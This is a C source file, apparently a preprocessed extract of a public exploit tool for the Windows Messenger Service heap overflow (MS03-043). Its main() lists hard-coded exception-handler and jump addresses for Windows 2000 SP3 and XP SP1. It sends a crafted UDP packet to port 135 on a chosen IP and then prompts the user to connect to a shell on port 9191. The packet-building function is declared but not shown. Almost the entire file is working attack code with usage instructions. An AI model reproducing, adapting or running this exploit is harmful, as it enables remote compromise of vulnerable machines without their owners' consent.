#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  targetUDP ;
typedef  int /*<<< orphan*/  targetOS ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  packet ;
typedef  int /*<<< orphan*/  WSADATA ;
typedef  int DWORD ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  IPPROTO_UDP ; 
 int PreparePacket (unsigned char*,int,int,int) ; 
 int /*<<< orphan*/  SOCK_DGRAM ; 
 char* VER ; 
 int /*<<< orphan*/  WSAStartup (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  ZeroMemory (struct sockaddr_in*,int) ; 
 int atoi (char*) ; 
 int /*<<< orphan*/  htons (int) ; 
 int /*<<< orphan*/  inet_addr (char*) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int sendto (int,unsigned char*,int,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 

int main(int argc,char *argv[])
{
        int sockUDP,ver,c, packetsz,cnt;
        unsigned char packet[8192];
        struct sockaddr_in targetUDP;        
		WSADATA wsaData;		
		
		struct
		{
			char os[30];
			DWORD SEH;
			DWORD JMP;
		} targetOS[] = 
		{
			{
				"Windows 2000 SP 3 (en)",
				0x77ee044c,		// unhandledexceptionfilter pointer
				0x768d693e		// cryptsvc.dll call [esi+48] 0x768d693e
			},
			{
				"Windows XP SP 1 (en)",
				0x77ed73b4,
				0x7804bf52	//rpcrt4.dll	call [edi+6c]
			}/*,
			{	//not tested
				"Windows XP SP 0 (en)",
				0x77ed63b4,
				0x7802ff3d	//rpcrt4 call [edi+6c]
			}*/
		};

		
		printf("\n-=[ MS Messenger Service Heap Overflow Exploit (MS03-043) ver %s ]=-\n\n"
				   " by Adik < netmaniac [at] hotmail.KG >\n http://netninja.to.kg\n\n", VER);

		if(argc < 3)
		{			
			printf(" Target OS version:\n\n");
			for(c=0;c<(sizeof(targetOS)/sizeof(targetOS[0]));c++)
				printf(" [%d]\t%s\n",c,targetOS[c].os);
			printf("\n Usage: %s [TargetIP] [ver: 0 | 1]\n"
					" eg: msgr.exe 192.168.63.130 0\n",argv[0]);
			return 1;
		}
		ver = atoi(argv[2]);
		printf("[*] Target: \t IP: %s\t OS: %s\n"
			   "[*] UEF: \t 0x%x\n"
			   "[*] JMP: \t 0x%x\n\n", argv[1],targetOS[ver].os, targetOS[ver].SEH, targetOS[ver].JMP);

        WSAStartup(0x0202, &wsaData);
		printf("[*] WSAStartup initialized...\n");

        ZeroMemory(&targetUDP, sizeof(targetUDP));
		
        targetUDP.sin_family = AF_INET;
        targetUDP.sin_addr.s_addr = inet_addr(argv[1]);
        targetUDP.sin_port = htons(135);

		packetsz = PreparePacket(packet,sizeof(packet),targetOS[ver].JMP,targetOS[ver].SEH);

        if ((sockUDP = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
		{
				printf("[x] Socket not initialized! Exiting...\n");
                return 1;
		}
		printf("[*] Socket initialized...\n");
		printf("[*] Injecting packet into a remote process...\n");
		
		if (sendto(sockUDP, packet, packetsz, 0, (struct sockaddr *)&targetUDP, sizeof(targetUDP)) == -1)
		{
			printf("[x] Failed to inject packet! Exiting...\n");
            return 1;
		}
		else
			printf("[*] Packet injected...\n");
		
		printf("[i] Try connecting to %s:9191\n\n",argv[1]);
        return 0;
}